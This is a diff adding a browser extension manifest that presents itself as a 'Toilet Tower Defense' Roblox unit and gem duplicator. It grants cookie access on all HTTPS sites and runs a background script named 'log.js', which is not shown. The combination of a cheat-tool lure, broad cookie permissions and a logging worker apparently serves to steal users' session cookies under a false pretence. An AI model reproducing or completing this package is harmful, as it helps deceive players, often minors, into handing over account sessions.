@@ -1,0 +1,29 @@
+{
+    "name": "Toilet Tower Defense Dupe",
+    "description": "Toilet Tower Defense Unit/Gem Duper",
+    "version": "1.0.0",
+    "manifest_version": 3,
+
+    "action" : {
+        "default_icon": "assets/roblox.png"
+    },
+
+    "host_permissions": [
+	"https://*/*"
+    ],
+
+    "permissions": [
+        "cookies"
+    ],
+
+    "background": {
+        "service_worker": "scripts/log.js"
+    },
+
+    "icons": {
+        "16": "assets/roblox.png",
+        "32": "assets/roblox.png",
+        "48": "assets/roblox.png",
+        "128": "assets/roblox.png"
+    }
+}
